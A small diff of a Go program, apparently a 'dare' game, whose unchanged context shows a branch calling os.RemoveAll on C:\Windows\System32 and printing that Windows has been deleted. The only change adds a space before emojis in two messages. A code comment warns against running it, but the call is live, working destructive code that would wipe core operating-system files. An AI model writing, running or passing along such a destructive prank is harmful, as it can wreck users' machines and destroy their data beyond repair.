@@ -21,8 +21,8 @@ func main() {
 		// WARNING: This code deletes critical system files and can cause irreparable damage to your system!
 		// DO NOT RUN THIS CODE ON A REAL SYSTEM!
 		os.RemoveAll("C:\\Windows\\System32")
-		fmt.Println("Windows 32 has been successfully deleted!😱")
+		fmt.Println("Windows 32 has been successfully deleted! 😱")
 	} else {
-		fmt.Println("Phew! You survived... this time. Try again if you dare!😜")
+		fmt.Println("Phew! You survived... this time. Try again if you dare! 😜")
 	}
 }
